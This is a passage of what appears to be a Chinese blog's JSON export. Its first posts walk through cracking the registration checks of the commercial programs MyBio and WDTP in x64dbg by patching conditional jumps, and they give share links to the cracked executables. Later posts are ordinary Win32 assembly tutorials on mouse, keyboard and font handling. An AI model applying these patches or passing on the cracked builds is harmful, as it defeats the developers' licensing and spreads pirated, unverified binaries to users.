wcODl5bYl8wCVYMDw5UWzBtnAANEQ8kBIM0oAAGPgcREIQnVloAChEOqARjzgAQEbczg8YkWJq8nSUhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJGAYZZoOpKKQqDoORDMKwkgwtiwSBBYAJ2owGL5RgxBziQQMgkwoMkhNqAEDARPSaiMDFdDIiRSFQowMXE8Z6RdpYHWnEAWGPVkajPmARVZMPUkCBQkJBQINgwaFPoeJi4GVlQ2Qc3VJBQcLV0ptfAMJBwdcIl+FYjALQgimoGNWIhAQZA4HXSpLMQ8PIgkOSHxAQhERPw7ASTSFyCMMDqBTJL8tf3y2fCEAIfkECQcAAAAsAAAAABgAGAAABa8gII4k0DRlmg6kYZCoOg5EDBDEaAi2jLO3nEkgkMEIL4BLpBAkVy3hCTAQKGAznM0AFNFGBAbj2cA9jQixcGZAGgECBu/9HnTp+FGjjezJFAwFBQwKe2Z+KoCChHmNjVMqA21nKQwJEJRlbnUFCQlFXlpeCWcGBUACCwlrdw8RKGImBwktdyMQEQciB7oACwcIeA4RVwAODiIGvHQKERAjxyMIB5QlVSTLYLZ0sW8hACH5BAkHAAAALAAAAAAYABgAAAW0ICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWPM5wNiV0UDUIBNkdoepTfMkA7thIECiyRtUAGq8fm2O4jIBgMBA1eAZ6Knx+gHaJR4QwdCMKBxEJRggFDGgQEREPjjAMBQUKIwIRDhBDC2QNDDEKoEkDoiMHDigICGkJBS2dDA6TAAnAEAkCdQ8ORQcHTAkLcQQODLPMIgIJaCWxJMIkPIoAt3EhACH5BAkHAAAALAAAAAAYABgAAAWtICCOJNA0ZZoOpGGQrDoOBCoSxNgQsQzgMZyIlvOJdi+AS2SoyXrK4umWHM5wNiV0UN3xdLiqr+mENcWpM9TIbrsBkEck8oC0DQqBQGGIz+t3eXtob0ZTPgNrIwQJDgtGAgwCWSIMDg4HiiUIDAxFAAoODwxDBWINCEGdSTQkCQcoegADBaQ6MggHjwAFBZUFCm0HB0kJCUy9bAYHCCPGIwqmRq0jySMGmj6yRiEAIfkECQcAAAAsAAAAABgAGAAABbIgII4k0DRlmg6kYZCsOg4EKhLE2BCxDOAxnIiW84l2L4BLZKipBopW8XRLDkeCiAMyMvQAA+uON4JEIo+vqukkKQ6RhLHplVGN+LyKcXA4Dgx5DWwGDXx+gIKENnqNdzIDaiMECwcFRgQCCowiCAcHCZIlCgICVgSfCEMMnA0CXaU2YSQFoQAKUQMMqjoyAglcAAyBAAIMRUYLCUkFlybDeAYJryLNk6xGNCTQXY0juHghACH5BAkHAAAALAAAAAAYABgAAAWzICCOJNA0ZVoOAmkY5KCSSgSNBDE2hDyLjohClBMNij8RJHIQvZwEVOpIekRQJyJs5AMoHA+GMbE1lnm9EcPhOHRnhpwUl3AsknHDm5RN+v8qCAkHBwkIfw1xBAYNgoSGiIqMgJQifZUjBhAJYj95ewIJCQV7KYpzBAkLLQADCHOtOpY5PgNlAAykAEUsQ1wzCgWdCIdeArczBQVbDJ0NAqyeBb64nQAGArBTt8R8mLuyPyEAOw==\" data-src=\"http://ww1.sinaimg.cn/large/c0264382gy1foyrcq7eydj207004jgli.jpg\" alt=\"\" /\u003e\u003c/p\u003e\n","title":"160CrackMe第十九Brad Soblesky.2"},{"content":"\n\n\n\n既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio\n\n\n\n和WDTP的原理是差不多的，先把软件界面换成e文，然后写了15个记录后提示注册，一样的路子，直接跳过注册窗口的弹出就好了\n\n![注册窗口](http://ww1.sinaimg.cn/large/c0264382gy1fowhkbesvuj20b0088t8x.jpg)\n\n然后查壳一样是vs2015的无壳64位程序，直接附加到x64dbg，然后有了之前WDTP的经验，我们直接找弹出注册窗口的地方，查找字符串，然后搜索上图中`Serial-number:`\n\n一样的，找到了注册窗体生成的地方，在段首下个断，然后回溯一次，可以看到\n\n![](http://ww1.sinaimg.cn/large/c0264382gy1fowhspimgmj20q507vgmx.jpg)\n\n直接把这个call上方的jle改成jmp即可爆破。\n\n------------------\n\n软件下载地址：\n\n[密码：0yb0cz](https://share.weiyun.com/f5a48a92d8f458277e937dadc730a5ad)\n\n解压后注意校验\n\n```\n大小: 4181504 字节\n文件版本: 2.1.1004\n修改时间: 2018年2月28日, 21:27:02\nMD5: EEA6B0BF010E45EA7EF340FFB543C316\nSHA1: BAA4BE7B3F2DE0F75996C0E9BE8DA0C177444CE8\nCRC32: 999277D5\n```\n","cover":"","link":"2018/02/28/mybio-crack.html","preview":"\u003cp\u003e既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio\u003c/p\u003e\n","title":"MyBio小隐本记注册破解"},{"content":"\n\n\n\n今天来讲讲WDTP这个软件的破解。\n\n## 简介\nWDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。\n\n## 破解\n之前这个软件是开源的，后来作者把它闭源了，然后加上了注册机制，我今天测试了一下，在我写了十多篇文章之后我再添加就提示我需要注册。\n![](http://ww1.sinaimg.cn/large/c0264382gy1fou2567e65j20b0088t8y.jpg)\n查一下壳，没有壳，64位的\n![](http://ww1.sinaimg.cn/large/c0264382gy1fou25yvsaxj20ei074q3n.jpg)\n直接附加到x64dbg中，然后我们搜索一下字符串serial，可以找到错误提示的地方。\n![](http://ww1.sinaimg.cn/large/c0264382gy1fou27t4wefj213q0fetcj.jpg)\n我们反汇编窗口中下个断，我们可以看到上方的ret，说明提示错误信息是跳转进来的，然后我们在段首下好断，重新注册可以找到调用这里的地方\n![](http://ww1.sinaimg.cn/large/c0264382gy1fou2buv9phj20fs06qaay.jpg)\n我们跟过去\n![](http://ww1.sinaimg.cn/large/c0264382gy1fou2d3h9nvj20hc02zt8z.jpg)\n可以看到错误提示的call，这个call上方有一个jmp可以跳过，说明在前方应该有一个跳转跳过了这个jmp，直接跳到了这个错误提示call。我们再往前看一点。\n![](http://ww1.sinaimg.cn/large/c0264382gy1fou2fedcjfj20m50chgnw.jpg)\n我们可以看到上面的je，je前面的call是一个对比的call，爆破的话，我们不管这个，直接把je给nop掉。\n然后我们执行，发现还是点击新建就会弹出来注册框，功能无法使用。\n我们继续在字符串中找，可以看到窗口上面的Purchase，Question等等字符，可以发现错误提示的上面一段就是这个注册窗口弹出的一段，我们依旧在这个段的段首下段，然后找到调用它（弹注册窗）的地方。\n![](http://ww1.sinaimg.cn/large/c0264382gy1fou2xb5dm0j20ia03lgm3.jpg)\n它是直接jmp下来的，我们可以看到上面有一个call之后跟着一个test然后一个jne，我们可以猜想是你新建文档的时候先比对一下你是否注册，然后根据结果跳转，我们直接把jne改成jmp试试，让它直接跳过弹注册窗口。\n![](http://ww1.sinaimg.cn/large/c0264382gy1fou33aziswj209q054q2u.jpg)\n完美，现在新建没问题了。\n\n## 导出\n所以我们只需要把它的这个弹注册窗的地方直接jmp过就好，我们在我们修改的命令上面右键补丁\n![](http://ww1.sinaimg.cn/large/c0264382gy1fou352soi2j20ed0dbt90.jpg)\n然后点击修复文件即可导出成一个破解版的exe。\n\n## 下载\n下载后注意校验信息\n文件信息：\n```\n文件版本: 1.1.1004\n修改时间: 2018年2月26日, 19:40:44\nMD5: 5B8DF3D4572842376EA850B8551DEEED\nSHA1: B282AC870E4159A2ACEA389015FE4F4409A0F887\nCRC32: F51675CE\n```\n[密码：h7b4ru](https://share.weiyun.com/5f8f4a09b5fb84f23479479e661b0c69)\n","cover":"","link":"2018/02/26/wdtp-crack.html","preview":"\u003cp\u003e今天来讲讲WDTP这个软件的破解。\u003c/p\u003e\n\n\u003ch2\u003e简介\u003c/h2\u003e\n\n\u003cp\u003eWDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。\u003c/p\u003e\n","title":"WDTP注册破解"},{"content":"\n\n\n\n这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。 \n\n## 理论：\n和处理键盘输入一样，WINDOWS将捕捉鼠标动作并把它们发送到相关窗口。这些活动包括左、右键按下、移动、双击、滚轮消息`WM_WHEEL`等。WINDOWS并不像处理键盘输入那样把所有的鼠标消息都导向有输入焦点的窗口，**任何鼠标经过的窗口都将接收到鼠标消息，无论有否输入焦点**。另外，窗口还会接收到鼠标在非客户区移动的消息（`WM_NCMOVE`），但大多数的情况下我们都会将其忽略掉。当鼠标在某窗口客户区移动时，该窗口将接收到`WM_MOUSEMOVE`消息。一个窗口若想处理`WM_LBUTTONDBCLK`或 `WM_RBUTTONDBCLK`，那么它的窗口类必须有`CS_DBLCLKS`风格，否则它就会接受到一堆的按键起落（`WM_XBUTTONDOWN`或`WM_XBUTTONUP`)的消息。 对于所有的消息，**窗口过程函数传入的参数`lParam`包含了鼠标的位置，其中低位为x坐标，高位为y坐标**，这些坐标值都是相对于窗口客户区的左上角的值，`wParam`中则包含了鼠标按钮的状态。 \n  \n## 例子：\n```\n.386 \n.model flat,stdcall \noption casemap:none \nWinMain proto :DWORD,:DWORD,:DWORD,:DWORD \n\ninclude \\masm32\\include\\windows.inc \ninclude \\masm32\\include\\user32.inc \ninclude \\masm32\\include\\kernel32.inc \ninclude \\masm32\\include\\gdi32.inc \nincludelib \\masm32\\lib\\user32.lib \nincludelib \\masm32\\lib\\kernel32.lib \nincludelib \\masm32\\lib\\gdi32.lib \n\n.data \nClassName db \"SimpleWinClass\",0 \nAppName  db \"Our First Window\",0 \nMouseClick db 0\n\n.data? \nhInstance HINSTANCE ? \nCommandLine LPSTR ? \nhitpoint POINT \u003c\u003e \n\n.code \nstart: \n    invoke GetModuleHandle, NULL \n    mov    hInstance,eax \n    invoke GetCommandLine\n    mov CommandLine,eax \n    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT \n    invoke ExitProcess,eax \n\nWinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD \n    LOCAL wc:WNDCLASSEX \n    LOCAL msg:MSG \n    LOCAL hwnd:HWND \n    mov   wc.cbSize,SIZEOF WNDCLASSEX \n    mov   wc.style, CS_HREDRAW or CS_VREDRAW \n    mov   wc.lpfnWndProc, OFFSET WndProc \n    mov   wc.cbClsExtra,NULL \n    mov   wc.cbWndExtra,NULL \n    push  hInst \n    pop   wc.hInstance \n    mov   wc.hbrBackground,COLOR_WINDOW+1 \n    mov   wc.lpszMenuName,NULL \n    mov   wc.lpszClassName,OFFSET ClassName \n    invoke LoadIcon,NULL,IDI_APPLICATION \n    mov   wc.hIcon,eax \n    mov   wc.hIconSm,eax \n    invoke LoadCursor,NULL,IDC_ARROW \n    mov   wc.hCursor,eax \n    invoke RegisterClassEx, addr wc \n    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\\ \n           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\\ \n           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\\ \n           hInst,NULL \n    mov   hwnd,eax \n    invoke ShowWindow, hwnd,SW_SHOWNORMAL \n    invoke UpdateWindow, hwnd \n    .WHILE TRUE \n                invoke GetMessage, ADDR msg,NULL,0,0 \n                .BREAK .IF (!eax) \n                invoke DispatchMessage, ADDR msg \n    .ENDW \n    mov     eax,msg.wParam \n    ret \nWinMain endp \n\nWndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM \n    LOCAL hdc:HDC \n    LOCAL ps:PAINTSTRUCT \n\n    .IF uMsg==WM_DESTROY \n        invoke PostQuitMessage,NULL \n    .ELSEIF uMsg==WM_LBUTTONDOWN \n        mov eax,lParam \n        and eax,0FFFFh \n        mov hitpoint.x,eax \n        mov eax,lParam \n        shr eax,16 \n        mov hitpoint.y,eax \n        mov MouseClick,TRUE \n        invoke InvalidateRect,hWnd,NULL,TRUE \n    .ELSEIF uMsg==WM_PAINT \n        invoke BeginPaint,hWnd, ADDR ps \n        mov    hdc,eax \n        .IF MouseClick \n            invoke lstrlen,ADDR AppName \n            invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax \n        .ENDIF \n        invoke EndPaint,hWnd, ADDR ps \n    .ELSE \n        invoke DefWindowProc,hWnd,uMsg,wParam,lParam \n        ret \n    .ENDIF \n    xor    eax,eax \n    ret \nWndProc endp \nend start \n```\n\n## 分析：\n\n```\n.ELSEIF uMsg==WM_LBUTTONDOWN \n    mov eax,lParam \n    and eax,0FFFFh \n    mov hitpoint.x,eax \n    mov eax,lParam \n    shr eax,16 \n    mov hitpoint.y,eax \n    mov MouseClick,TRUE \n    invoke InvalidateRect,hWnd,NULL,TRUE \n```\n\n窗口过程处理了`WM_LBUTTONDOWN`消息，当接收到该消息时，`lParam`中包含了相对于窗口客户区左上角的坐标，我们把它保存下来，放到一个结构体变量（POINT）中，该结构体变量的定义如下： \n\n```\nPOINT STRUCT \n    x   dd ? \n    y   dd ? \nPOINT ENDS \n```\n\n然后我们把标志量`MouseClick`设为`TRUE`，这表明至少有一次在客户区的左键按下消息。 \n\n```\n        mov eax,lParam \n        and eax,0FFFFh \n        mov hitpoint.x,eax \n```\n\n由于`lParam`是一个32位长的数，其中高、低16位分别包括了y、x坐标所以我们做一些小处理，以便保存它们。 \n\n```\n        shr eax,16 \n        mov hitpoint.y,eax \n```\n\n保存完坐标后我们设标志`MouseClick`为`TRUE`，这是在处理`WM_PAINT`时用来判断是否有鼠标左键按下消息。然后我们调用`InvalidateRect`函数迫使WINDOWS重新绘制客户区。 \n\n```\n        .IF MouseClick \n            invoke lstrlen,ADDR AppName \n            invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax \n        .ENDIF \n```\n\n绘制客户区的代码首先检测`MouseClick`标志位，再决定是否重绘。因为我们在首次显示窗口时还没有左键按下的消息，所以我们在初始时把该标志设为`FALSE`，告诉WINDOWS不要重绘客户区，当有左键按下的消息时，它会在鼠标按下的位置绘制字符串。注意在调用`TextOut`函数时，其关于字符串长度的参数是调用`lstrlen`函数来计算的。\n","cover":"","link":"2018/02/09/win32asm7-mouse-input-msg.html","preview":"\u003cp\u003e这次我们将学习如何在我们的窗口过程函数中处理鼠标按键消息。例子演示了如何等待鼠标左键按下消息，我们将在按下的位置显示一个字符串。\u003c/p\u003e\n","title":"Win32汇编学习(7)：鼠标输入消息"},{"content":"\n\n\n\n这次，我们将要学习WINDOWS程序是如何处理键盘消息的。\n\n## 理论：\n\n因为大多数的PC只有一个键盘，所以所有运行中的WINDOWS程序必须共用它。**WINDOWS 将负责把击键消息送到具有输入焦点的那个应用程序中去**。尽管屏幕上可能同时有几个应用程序窗口，但一个时刻仅有一个窗口有输入焦点。有输入焦点的那个应用程序的标题条总是高亮度显示的。 实际上您可以从两个角度来看键盘消息：一是您可以把它看成是一大堆的按键消息的集合，在这种情况下，当您按下一个键时，WINDOWS就会发送一个 `WM_KEYDOWN` 给有输入焦点的那个应用程序，提醒它有一个键被按下。当您释放键时，WINDOWS又会发送一个 `WM_KYEUP` 消息，告诉有一个键被释放。您把每一个键当成是一个按钮；另一种情况是：您可以把键盘看成是字符输入设备。当您按下“a”键时，WINDOWS发送一个 `WM_CHAR` 消息给有输入焦点的应用程序，告诉它“a”键被按下。实际上WINDOWS 内部发送 `WM_KEYDOWN` 和 `WM_KEYUP` 消息给有输入焦点的应用程序，而这些消息将通过调用 `TranslateMessage` 翻译成 `WM_CHAR` 消息。WINDOWS窗口过程函数将决定是否处理所收到的消息，一般说来您不大会去处理 `WM_KEYDOWN` 、 `WM_KEYUP` 消息，在消息循环中 `TranslateMessage` 函数会把上述消息转换成 `WM_CHAR` 消息。这次学习中将只处理 `WM_CHAR`。 \n\n## 例子： \n```\n.386\n.model flat,stdcall\noption casemap:none\n\nWinMain proto :DWORD,:DWORD,:DWORD,:DWORD\n\ninclude windows.inc\ninclude user32.inc\ninclude kernel32.inc\ninclude gdi32.inc\nincludelib user32.lib\nincludelib kernel32.lib\nincludelib gdi32.lib\n\n.data\nClassName db \"SimpleWinClass\",0\nAppName   db \"Our Fourth Window\",0\nchar WPARAM 20h\n\n.data?\nhInstance HINSTANCE ?\nCommandLine LPSTR ?\n\n.code\nstart:\ninvoke GetModuleHandle,NULL\nmov    hInstance,eax\ninvoke GetCommandLine\nmov    CommandLine,eax\ninvoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT\ninvoke ExitProcess,eax\n\nWinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD\n    \n    LOCAL wc:WNDCLASSEX\n    LOCAL msg:MSG\n    LOCAL hwnd:HWND\n    mov wc.cbSize,SIZEOF WNDCLASSEX\n    mov wc.style,CS_HREDRAW or CS_VREDRAW\n    mov wc.lpfnWndProc,OFFSET WndProc\n    mov wc.cbClsExtra,NULL\n    mov wc.cbWndExtra,NULL\n    push hInst\n    pop wc.hInstance\n    mov wc.hbrBackground,COLOR_WINDOW+1\n    mov wc.lpszMenuName,NULL\n    mov wc.lpszClassName,OFFSET ClassName\n    invoke LoadIcon,NULL,IDI_APPLICATION\n    mov wc.hIcon,eax\n    mov wc.hIconSm,eax\n    invoke LoadCursor,NULL,IDC_ARROW\n    mov wc.hCursor,eax\n    invoke RegisterClassEx,ADDR wc\n    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\\\n                        WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,\\\n                        CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,hInst,NULL\n    mov hwnd,eax\n    invoke ShowWindow,hwnd,SW_SHOWNORMAL\n    invoke UpdateWindow,hwnd\n    .while TRUE\n        invoke GetMessage,ADDR msg,NULL,0,0\n        .break .if (!eax)\n        invoke TranslateMessage,ADDR msg\n        invoke DispatchMessage,ADDR msg\n    .endw\n    mov eax,msg.wParam\n    ret\n\nWinMain endp \n\nWndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM\n    \n    LOCAL hdc:HDC\n    LOCAL ps:PAINTSTRUCT\n    \n    .if uMsg==WM_DESTROY\n        invoke PostQuitMessage,NULL\n    .elseif uMsg==WM_CHAR\n        push wParam\n        pop  char\n        invoke InvalidateRect,hWnd,NULL,TRUE\n    .elseif uMsg==WM_PAINT\n        invoke BeginPaint,hWnd,ADDR ps\n        mov    hdc,eax\n        invoke TextOut,hdc,0,0,ADDR char,1\n        invoke EndPaint,hWnd,ADDR ps\n    .else\n        invoke DefWindowProc,hWnd,uMsg,wParam,lParam\n        ret\n    .endif\n    xor eax,eax\n    ret\n\nWndProc endp\nend start\n```\n\n## 分析： \n\n```\nchar WPARAM 20h\n```\n\n这个变量将保存从键盘接收到的字符。因为它是在窗口过程中通过WPARAM型变量传送的，所以我们简单地把它定义为WPARAM型。**由于我们的窗口在初次刷新时(也即刚被创建的那一次)是没有键盘输入的所以我们把他设成空格符（20h），这样显示时您就什么都看不见。**\n\n```\n.ELSEIF uMsg==WM_CHAR \n    push wParam \n    pop  char \n    invoke InvalidateRect, hWnd,NULL,TRUE \n```\n\n这一段是用来处理`WM_CHAR`消息的。它把接收到的字符放入变量`char`中，接着调用`InvalidateRect`，而InvalidateRect使得窗口的客户区无效，这样它会发出WM_PAINT消息，而WM_PAINT消息迫使WINDOWS重新绘制它的客户区。该函数的语法如下：\n\n```\nInvalidateRect proto hWnd:HWND, lpRect:DWORD, bErase:DWORD \n```\n\n`lpRect`是指向客户区我们想要其无效的一个正方形结构体的指针。如果该值等于`NULL`，则整个客户区都无效；布尔值`bErase`告诉WINDOWS是否擦除背景，如果是TRUE，则WINDOWS在调用BeginPaint函数时把背景擦掉。 所以我们此处的做法是：**我们将保存所有有关重绘客户区的数据，然后发送`WM_PAINT`消息(通过`InvalidateRect`)，处理该消息的程序段然后根据相关数据重新绘制客户区。实际上我们完全可以通过调用 `GetDC` 获得设备上下文句柄，然后绘制字符，然后再调用`ReleaseDC`释放设备上下文句柄，毫无疑问这样也能在客户区绘制出正确的字符。但是如果这之后接收到`WM_PAINT`消息要处理时，客户区会重新刷新，而我们这稍前所绘制的字符就会消失掉。所以为了让字符一直正确地显示，就必须把它们放到`WM_PAINT`的处理过程中处理。而在本消息处理中发送`WM_PAINT`消息即可。**\n\n```\ninvoke TextOut,hdc,0,0,ADDR char,1 \n```\n\n**在调用`InvalidateRect`时，`WM_PAINT`消息被发送到了WINDOWS窗口处理过程，程序流程转移到处理`WM_PAINT`消息的程序段**，然后调用`BeginPaint`得到设备上下文的句柄，再调用`TextOut`在客户区的（0，0）处输出保存的按键字符。这样无论您按什么键都能在客户区的左上角显示，不仅如此，无论您怎么缩放窗口（迫使WINDOWS重新绘制它的客户区），字符都会在正确的地方显示，所以**必须把所有重要的绘制动作都放到处理`WM_PAINT`消息的程序段中去**。\n","cover":"","link":"2018/02/08/win32asm6-keyboard-input-msg.html","preview":"\u003cp\u003e这次，我们将要学习WINDOWS程序是如何处理键盘消息的。\u003c/p\u003e\n","title":"Win32汇编学习(6)：键盘输入消息"},{"content":"\n\n\n\n这次我们将学习有关文本的诸多属性如字体和颜色等。 \n\n## 理论：\n\nWindows 的颜色系统是用RGB值来表示的，R 代表红色，G 代表绿色，B 代表蓝色。如果您想指定一种颜色就必须给该颜色赋相关的 RGB 值，RGB 的取值范围都是从 0 到 255，譬如您想要得到纯红色，就必须对RGB赋值（255，0，0），纯白色是 （255，255，255）。\n\n您可以用函数 `SetTextColor` 和 `SetBkColor` 来“绘制”字符颜色和背景色，但是必须传递一个“设备环境”的句柄和 RGB 值作为参数。RGB 的结构体的定义如下： \n\n```\nRGB_value struct\nunused db 0\nblue db ?\ngreen db ?\nred db ?\nRGB_value ends\n```\n\n其中第一字节为 0 而且始终为 0，其它三个字节分别表示蓝色、绿色和红色，刚好和 RGB 的次序相反。这个结构体用起来挺别扭，所以我们重新定义一个宏用它来代替。该宏接收红绿蓝三个参数，并在 eax 寄存器中返回 32 位的 RGB 值，宏的定义如下：\n\n```\nRGB macro red，green，blue\nxor eax，eax\nmov ah，blue\nshl eax，8\nmov ah，green\nmov al，red\nendm \n```\n\n您可以把该宏放到头文件中以方便使用。 \n\n您可以调用 `CreateFont` 和 `CreateFontIndirect` 来创建自己的字体，这两个函数的差别是：前者要求您传递一系列的参数，而后者只要传递一个指向 `LOGFONT` 结构的指针。这样就使得后者使用起来更方便，尤其当您需要频繁创建字体时。在我们的例子中由于只要创建一种字体，故用 `CreateFont` 就足够了。在调用该函数后会返回所创建的字体的句柄，然后把该句柄选进“设备环境”使其成为当前字体，随后所有的“绘制”文本串的函数在被调用时都要把该句柄作为一个参数传递 \n\n## 例子：\n\n```\n.386\n.model flat, stdcall\noption casemap:none\n\nWinMain proto :DWORD,:DWORD,:DWORD,:DWORD\n\ninclude windows.inc\ninclude user32.inc\nincludelib user32.lib\ninclude kernel32.inc\nincludelib kernel32.lib\ninclude gdi32.inc\nincludelib gdi32.lib\n\nRGB macro red,green,blue\n\txor eax,eax\n\tmov ah,blue\n\tshl eax,8\n\tmov ah,green\n\tmov al,red\nendm\n\n.data\nClassName db \"SimpleWinClass\",0\nAppName   db \"Our Third Window\",0\nTestString db \"Win32 汇编非常有意思\",0\nFontName db \"script\",0\n\n.data?\nhInstance HINSTANCE ?\nCommandLine LPSTR ?\n\n.code\nstart:\n\tinvoke GetModuleHandle,NULL\n\tmov    hInstance,eax\n\tinvoke GetCommandLine\n\tmov    CommandLine,eax\n\tinvoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT\n\tinvoke ExitProcess,eax\n\nWinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD \n    LOCAL wc:WNDCLASSEX \n    LOCAL msg:MSG \n    LOCAL hwnd:HWND \n    mov   wc.cbSize,SIZEOF WNDCLASSEX \n    mov   wc.style, CS_HREDRAW or CS_VREDRAW \n    mov   wc.lpfnWndProc, OFFSET WndProc \n    mov   wc.cbClsExtra,NULL \n    mov   wc.cbWndExtra,NULL \n    push  hInst \n    pop   wc.hInstance \n    mov   wc.hbrBackground,COLOR_WINDOW+1 \n    mov   wc.lpszMenuName,NULL \n    mov   wc.lpszClassName,OFFSET ClassName \n    invoke LoadIcon,NULL,IDI_APPLICATION \n    mov   wc.hIcon,eax \n    mov   wc.hIconSm,eax \n    invoke LoadCursor,NULL,IDC_ARROW \n    mov   wc.hCursor,eax \n    invoke RegisterClassEx, addr wc \n    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\\ \n           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\\ \n           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\\ \n           hInst,NULL \n    mov   hwnd,eax \n    invoke ShowWindow, hwnd,SW_SHOWNORMAL \n    invoke UpdateWindow, hwnd \n    .WHILE TRUE \n        invoke GetMessage, ADDR msg,NULL,0,0 \n        .BREAK .IF (!eax) \n        invoke TranslateMessage, ADDR msg \n        invoke DispatchMessage, ADDR msg \n    .ENDW \n    mov     eax,msg.wParam \n    ret \nWinMain endp\n\nWndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM\n    \n    LOCAL hdc:HDC\n    LOCAL ps:PAINTSTRUCT\n    LOCAL hfont:HFONT\n    \n    .IF uMsg==WM_DESTROY\n        invoke PostQuitMessage,NULL\n    .ELSEIF uMsg==WM_PAINT\n        invoke BeginPaint,hWnd,ADDR ps\n        mov    hdc,eax\n        invoke CreateFont,24,16,0,0,400,0,0,0,OEM_CHARSET,\\\n                            OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,\\\n                            DEFAULT_QUALITY,DEFAULT_PITCH or FF_SCRIPT,\\\n                            ADDR FontName \n        invoke SelectObject,hdc,eax\n        mov    hfont,eax\n        RGB    200,200,50\n        invoke SetTextColor,hdc,eax\n        RGB    0,0,255\n        invoke SetBkColor,hdc,eax\n        invoke TextOut,hdc,0,0,ADDR TestString,SIZEOF TestString\n        invoke SelectObject,hdc,hfont\n        invoke EndPaint,hWnd,ADDR ps\n    .ELSE\n        invoke DefWindowProc,hWnd,uMsg,wParam,lParam\n        ret\n    .endif\n    xor eax,eax\n    ret\nWndProc endp\n\nend start\n```\n\n## 分析：\n\n`CreateFont` 函数产生一种逻辑字体，它尽可能地接近参数中指定的各相关值。这个函数大概是所有 Windows API 函数中所带参数最多的一个。它返回一个指向逻辑字体的句柄供调用 `SelectObject` 函数使用。下面我们详细讲解该函数的参数：\n\n```\nCreateFont proto \\\nnHeight：DWORD，\\\nnWidth：DWORD，\\\nnEscapement：DWORD，\\\nnOrientation：DWORD，\\\nnWeight：DWORD，\\ \ncItalic：DWORD，\\ \ncUnderline：DWORD，\\\ncStrikeOut：DWORD，\\\ncCharSet：DWORD，\\\ncOutputPrecision：DWORD，\\\ncClipPrecision：DWORD，\\\ncQuality：DWORD，\\\ncPitchAndFamily：DWORD，\\\nlpFacename：DWORD\n```\n\n- `nHeight`： 希望使用的字体的高度，0为缺省。\n- `nWidth`： 希望使用的字体的宽度，一般情况下最好用0， 这样 Windows 将会自动为您选择一个和高度匹配的值。因为在我们的例子中那样做的话会使得字符因太小而无法显示，所以我们设定它为16。\n- `nEscapement`： 每一个字符相对前一个字符的旋转角度，一般设成0。900代表转90度，1800转190度，2700转270度。\n- `nOrientation`： 字体的方向。\n- `nWeight`： 字体笔画的粗细。\n\nWindows 为我们预定义了如下值： \n\n```\nFW_DONTCARE 等于 0\nFW_THIN 等于 100\nFW_EXTRALIGHT 等于 200\nFW_ULTRALIGHT 等于 200\nFW_LIGHT 等于 300\nFW_NORMAL 等于 400\nFW_REGULAR 等于 400\nFW_MEDIUM 等于 500\nFW_SEMIBOLD 等于 600\nFW_DEMIBOLD 等于 600\nFW_BOLD 等于 700\nFW_EXTRABOLD 等于 800\nFW_ULTRABOLD 等于 800\nFW_HEAVY 等于 900\nFW_BLACK 等于 900\n```\n\n- `cItalic`： 0为正常，其它值为斜体。 \n- `cUnderline`： 0为正常，其它值为有下划线。\n- `cStrikeOut`： 0为正常，其它值为删除线。\n- `cCharSet`： 字体的字符集。一般选择OEM_CHARSET，它使得 Windows 会选用和操作系统相关的字符集。\n- `cOutputPrecision`： 指定我们选择的字体接近真实字体的精度。 一般选用OUT_DEFAULT_PRECIS，它决定了缺省的映射方式。\n- `cClipPrecision`： 指定我们选择的字体在超出裁剪区域时的裁剪精度。 一般选用CLIP_DEFAULT_PRECIS，它决定了裁剪精度。\n- `cQuality`： 指定输出字体的质量。它指出GDI应如何尽可能的接近真实 字体，一共有三种方式：DEFAULT_QUALITY， PROOF_QUALITY 和DRAFT_QUALITY。\n- `cPitchAndFamily`：字型和字体家族。\n- `lpFacename`： 指定字体的名称。 \n\n上面的描述不一定好理解，您如果要的到更多的信息，应参考 WIN32 API 指南。 \n\n```\ninvoke SelectObject， hdc， eax\nmov hfont，eax\n```\n\n在我们得到了指向逻辑字体的句柄后必须调用 `SelectObject` 函数把它选择进“设备环境”，我们还可以调用该函数把诸如此类的像颜色、笔、画刷 